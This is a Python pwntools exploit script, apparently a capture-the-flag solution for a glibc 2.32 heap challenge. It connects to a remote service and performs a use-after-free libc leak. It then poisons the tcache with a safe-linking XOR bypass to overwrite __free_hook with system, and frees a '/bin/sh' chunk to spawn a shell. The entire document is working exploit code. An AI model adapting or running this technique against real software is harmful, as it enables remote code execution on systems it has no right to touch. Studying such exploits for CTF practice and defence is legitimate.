from pwn import * 
from pwn import p64


debug = 1
gdb_is = 0
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux',log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./vuln")
else:
    host = "182.148.156.200"
    r = connect(host,9135)#远程连接
    gdb_is =0

if gdb_is:
    # gdb.attach(r,'b* 0x4012ed')
    gdb.attach(r)
    pause()
    pass


libc = ELF('./libc-2.32.so')
elf = ELF('./vuln')

def add_note(page , size):
    r.sendlineafter(b'Exit',b'1')
    r.sendlineafter(b'Index:', str(page).encode())
    r.sendlineafter(b'Size:', str(size).encode())

def delete_note(page):
    r.sendlineafter(b'Exit',b'2')
    r.sendlineafter(b'Index:', str(page).encode())

def edit_note(page , content):
    r.sendlineafter(b'Exit',b'3')
    r.sendlineafter(b'Index:', str(page).encode())
    r.sendafter(b'Content:' , content)

def show_note(page):
    r.sendlineafter(b'>',b'4')
    r.sendlineafter(b'Index: ', str(page).encode())

for i in range(10):
    add_note(i,0x80)
for i in range(7):
    delete_note(i)

delete_note(8)
edit_note(8,b'a')
show_note(8)

libc_addr = u64(r.recv(6).ljust(8,b'\x00')) - 0x61 - 0x1e3c00
print(f'libc_addr  = {hex(libc_addr)}')
libc.address = libc_addr
system_addr = libc.sym['system']
free_hook = libc.sym['__free_hook']
print(f'free_hook = {hex(free_hook)}')
print(f'system_addr = {hex(system_addr)}')

show_note(0)
heap=u64(r.recv(5)+b'\x00\x00\x00')
edit_note(6,p64(free_hook ^ heap))
print(f'heap = {hex(heap)}')
print(f'free_hook ^ heap = {hex(free_hook ^ heap)}')
add_note(10,0x80)
edit_note(10,b'/bin/sh\x00')
add_note(11,0x80)
edit_note(11,p64(system_addr))
delete_note(10)


r.interactive()



